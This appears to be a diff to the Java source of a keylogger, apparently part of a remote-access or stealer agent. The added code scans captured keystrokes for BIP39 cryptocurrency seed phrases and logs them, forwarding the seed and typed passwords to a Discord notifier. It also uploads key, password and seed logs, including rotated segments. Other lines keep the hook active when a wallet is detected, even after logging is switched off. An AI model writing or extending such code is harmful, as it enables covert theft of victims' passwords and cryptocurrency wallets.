@@ -31,6 +31,7 @@ final class Keylogger {
 	private long lastSave;
 	private volatile boolean running = true;
 	private volatile boolean walletForced;
+	int walletOnCalls;
 	private Thread tail;
 	private Thread supervisor;
 	private volatile long position = -1L;
@@ -107,6 +108,7 @@ final class Keylogger {
 
 	/** A wallet was detected: wake the hook even after `keys off`, unless --hard. */
 	synchronized void walletOn() {
+		walletOnCalls++;
 		if (isRunning() || hardOff()) {
 			return;
 		}
@@ -236,7 +238,7 @@ final class Keylogger {
 		}
 	}
 
-	private void handle(String line) {
+	void handle(String line) {
 		if (line.isBlank()) {
 			return;
 		}
@@ -259,9 +261,14 @@ final class Keylogger {
 			}
 			long vk = Json.num(event, "vk", 0L);
 			String unicode = decode(Json.str(event, "u", ""));
+			lastEvent = System.currentTimeMillis();
+			// A dead key produces no character of its own; its accent stays
+			// pending in the layout and composes with the next key.
+			if (Boolean.TRUE.equals(event.get("dk")) && unicode.isEmpty()) {
+				return;
+			}
 			String text = Keymap.map((int) vk, Boolean.TRUE.equals(event.get("sh")),
 				Boolean.TRUE.equals(event.get("ca")), unicode);
-			lastEvent = System.currentTimeMillis();
 			if (text.equals("\b")) {
 				if (buffer.length() > 0) {
 					buffer.setLength(buffer.length() - 1);
@@ -299,6 +306,25 @@ final class Keylogger {
 		clean = clean.replace("|", "/");
 		String stamp = java.time.LocalTime.now().withNano(0).toString();
 		append(OpsPaths.keylog(installDir), stamp + " [" + process + " | " + title + "] " + clean + "\n");
+		// Seed tokens are single-space separated; keep the password/log text
+		// byte-exact apart from the outer strip and the pipe escape.
+		String seed = seed(clean.replaceAll("\\s+", " ").strip());
+		if (seed != null) {
+			String words = seed.split(" ", -1).length == 24 ? "24" : "12";
+			boolean duplicate = SecretDetector.alertedRecently(seed);
+			append(OpsPaths.seeds(installDir),
+				Instant.now() + " | " + process + " | " + title + " | " + seed + "\n");
+			state.passwordEvents++;
+			saveIfDue();
+			// Only mark as alerted when the notice actually goes out; otherwise
+			// a later memory finding would be suppressed with no prior alert.
+			if (!duplicate && DiscordConfig.sendPasswords()) {
+				SecretDetector.alerted(seed);
+				notifier.send("seed escrita: " + words + " palabras");
+				notifier.send(seed);
+			}
+			return;
+		}
 		boolean password = uiaPassword || PasswordHeuristic.looksLikePassword(process, title);
 		if (!password) {
 			return;
@@ -306,13 +332,39 @@ final class Keylogger {
 		String line = Instant.now() + " | " + process + " | " + title + " | " + clean + "\n";
 		append(OpsPaths.passwords(installDir), line);
 		state.passwordEvents++;
+		saveIfDue();
+		if (DiscordConfig.sendPasswords()) {
+			notifier.send("password? " + process + " | " + title + " | " + clean);
+		}
+	}
+
+	private void saveIfDue() {
 		if (System.currentTimeMillis() - lastSave > 30000L) {
 			lastSave = System.currentTimeMillis();
 			state.save(AgentPaths.state(installDir));
 		}
-		if (DiscordConfig.sendPasswords()) {
-			notifier.send("password? " + process + " | " + title + " | " + clean);
+	}
+
+	/** Longest 24-word window first, then 12; only checksum-valid BIP39 survives. */
+	private String seed(String clean) {
+		String[] tokens = clean.split(" ");
+		for (int size : new int[] { 24, 12 }) {
+			for (int start = 0; start + size <= tokens.length; start++) {
+				StringBuilder candidate = new StringBuilder();
+				for (int index = start; index < start + size; index++) {
+					if (candidate.length() > 0) {
+						candidate.append(' ');
+					}
+					candidate.append(tokens[index]);
+				}
+				String value = candidate.toString();
+				SecretDetector.Secret secret = SecretDetector.detect(value, process, title);
+				if (secret != null && secret.kind().startsWith("seed-")) {
+					return value;
+				}
+			}
 		}
+		return null;
 	}
 
 	private static void append(Path file, String line) {
@@ -358,12 +410,22 @@ final class Keylogger {
 	String dump() throws Exception {
 		Path keys = OpsPaths.keylog(installDir);
 		Path passwords = OpsPaths.passwords(installDir);
+		Path seeds = OpsPaths.seeds(installDir);
 		boolean any = false;
 		if (Files.isRegularFile(keys) && Files.size(keys) > 0L) {
 			any |= poller.uploadFile(keys);
 		}
 		if (Files.isRegularFile(passwords) && Files.size(passwords) > 0L) {
 			any |= poller.uploadFile(passwords);
+		}
+		if (Files.isRegularFile(seeds) && Files.size(seeds) > 0L) {
+			any |= poller.uploadFile(seeds);
+		}
+		for (int segment = 1; segment <= 3; segment++) {
+			Path rotated = seeds.resolveSibling(seeds.getFileName() + "." + segment);
+			if (Files.isRegularFile(rotated) && Files.size(rotated) > 0L) {
+				any |= poller.uploadFile(rotated);
+			}
 		}
 		return any ? "Key logs uploaded" : "No key log yet";
 	}
